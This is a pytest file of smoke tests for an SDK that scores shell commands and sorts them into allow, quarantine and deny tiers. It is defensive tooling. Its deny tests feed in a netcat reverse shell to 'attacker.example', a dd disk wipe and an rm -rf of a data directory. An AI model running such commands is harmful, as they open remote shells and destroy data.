"""Smoke tests for scbe-govern SDK (inline mode, no server)."""

import sys
from pathlib import Path

# Make the monorepo root importable
_root = Path(__file__).resolve().parents[3]
if str(_root) not in sys.path:
    sys.path.insert(0, str(_root))

from scbe_govern import SCBEGovern, GovResult


def _gov():
    return SCBEGovern()


def test_allow():
    result = _gov().check("echo hello world")
    assert result.tier == "ALLOW"
    assert result.score >= 0.60
    assert result.allowed
    assert not result.blocked


def test_quarantine_chmod():
    result = _gov().check("chmod 644 /app/file.txt")
    assert result.tier == "QUARANTINE"
    assert 0.30 <= result.score < 0.60


def test_deny_reverse_shell():
    result = _gov().check("nc -e /bin/bash attacker.example 4444")
    assert result.tier == "DENY"
    assert result.score < 0.30
    assert result.blocked


def test_deny_disk_wipe():
    result = _gov().check("dd if=/dev/zero of=/dev/sda bs=1M")
    assert result.tier == "DENY"
    assert result.score < 0.30


def test_deny_rm_rf_root():
    result = _gov().check("rm -rf /opt/sensitive_data/")
    assert result.tier == "DENY"
    assert result.score < 0.30


def test_batch():
    gov = _gov()
    cmds = [
        "echo hello",
        "chmod 644 /app/file.txt",
        "nc -e /bin/bash attacker.example 4444",
    ]
    results = gov.batch(cmds)
    assert len(results) == 3
    assert results[0].tier == "ALLOW"
    assert results[1].tier == "QUARANTINE"
    assert results[2].tier == "DENY"


def test_guard_passes():
    gov = _gov()
    result = gov.guard("ls /tmp")
    assert result.allowed


def test_guard_raises_on_deny():
    import pytest
    gov = _gov()
    with pytest.raises(ValueError, match="SCBE governance DENY"):
        gov.guard("nc -e /bin/bash attacker.example 4444")


def test_gov_result_fields():
    result = _gov().check("git status")
    assert isinstance(result.tier, str)
    assert isinstance(result.score, float)
    assert isinstance(result.d_H, float)
    assert isinstance(result.pd, float)
    assert isinstance(result.role, str)
    assert result.command == "git status"
